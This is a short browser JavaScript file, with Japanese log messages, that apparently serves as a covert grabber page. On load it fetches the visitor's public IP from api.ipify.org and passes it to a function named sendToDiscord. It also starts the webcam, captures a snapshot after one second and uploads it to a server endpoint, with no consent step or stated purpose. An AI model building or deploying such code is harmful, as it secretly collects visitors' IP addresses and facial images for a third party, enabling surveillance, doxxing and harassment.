const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        const ipAddress = data.ip;
        sendToDiscord(`IPアドレス: ${ipAddress}`);
    })
    .catch(error => console.error('IPアドレスの取得に失敗しました:', error));

navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
        setTimeout(captureImage, 1000);
    })
    .catch(err => {
        console.error('カメラの起動に失敗しました:', err);
    });

function captureImage() {
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
        if (!blob) {
            console.error('画像データが取得できませんでした（blobがnull）');
            return;
        }

        const formData = new FormData();
        formData.append('file', blob, 'image.png');

        fetch('/api/sendImage', {
            method: 'POST',
            body: formData,
        })
        .then(response => {
            if (response.ok) {
                console.log('画像が送信されました');
            } else {
                console.error('画像の送信に失敗しました:', response.status, response.statusText);
            }
        })
        .catch(error => {
            console.error('エラーが発生しました:', error);
        });
    }, 'image/png');
}

function sendToDiscord(message) {
    fetch('/api/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message }),
    })
    .then(response => {
        if (response.ok) {
            console.log('メッセージが送信されました');
        } else {
            console.error('メッセージの送信に失敗しました:', response.status, response.statusText);
        }
    })
    .catch(error => {
        console.error('エラーが発生しました:', error);
    });
}
